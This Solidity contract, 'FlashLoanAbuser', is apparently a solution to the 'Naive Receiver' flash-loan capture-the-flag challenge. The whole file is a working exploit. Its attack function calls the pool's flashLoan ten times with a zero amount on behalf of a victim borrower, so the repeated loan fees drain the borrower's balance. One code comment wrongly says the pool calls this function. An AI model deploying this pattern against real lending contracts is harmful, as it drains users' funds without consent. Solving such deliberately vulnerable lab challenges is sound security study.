// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface INaiveReceiverLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract FlashLoanAbuser {
    using Address for address payable;

    address public pool;

    constructor(address poolAddress) {
        pool = poolAddress;
    }

    // Function called by the pool during flash loan
    function attack(address borrower) external {
        INaiveReceiverLenderPool poolContract = INaiveReceiverLenderPool(pool);

        for (uint i = 0; i < 10; i++) {
            poolContract.flashLoan(borrower, 0);
        }
    }
}